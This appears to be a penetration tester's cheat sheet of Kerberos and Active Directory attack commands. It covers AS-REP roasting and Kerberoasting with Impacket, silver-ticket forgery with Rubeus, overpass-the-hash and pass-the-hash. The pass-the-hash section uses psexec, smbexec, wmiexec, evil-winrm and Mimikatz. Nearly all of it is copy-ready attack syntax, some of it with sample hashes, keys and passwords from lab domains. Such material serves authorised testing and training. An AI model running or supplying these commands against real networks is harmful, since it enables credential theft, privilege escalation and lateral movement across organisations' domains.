Kerberos
========================

AS-REP Roasting
```
impacket-GetNPUsers -request domain/ -usersfile usernames.txt -dc-ip <hostname>
```

## Kerberoasting
```
impacket-GetUserSPNs -request domain/user:password -dc-ip <hostname>
```
## Silver Ticket

```
rubeus.exe silver /service:cifs/dc1.ignite.local /rc4:64FBAE31CC352FC26AF97CBDEF151E03 /ldap /creduser:ignite.local\Administrator /credpassword:Ignite@987 /user:harshitrajpal /krbkey:EA2344691D140975946372D18949706857EB9C5F65855B0E159E54260BEB365C /krbenctype:aes256 /domain:ignite.local /ptt
```

## Overpass the hash

    impacket-getTGT -hashes :f6b7160bfc91823792e0ac3a162c9267 HTB.LOCAL/Administrator -dc-ip 10.10.10.103
    
    cp user.ccache /tmp/krb5cc_0
    export KRB5CCNAME=/tmp/krb5cc_0
    
    klist

## Pass the hash

### Impacket and evil-winrm
```
evil-winrm -i <hostname> -u user -H lmhash:nthash
impacket-psexec user@<hostname> -hashes lmhash:nthash
impacket-smbexec user@<hostname> -hashes lmhash:nthash
impacket-wmiexec user@<hostname> -hashes lmhash:nthash
```

### Rubeus and Mimikatz
```
sekurlsa::pth /user:<username> /domain:<domain> /ntlm:<hash>

```
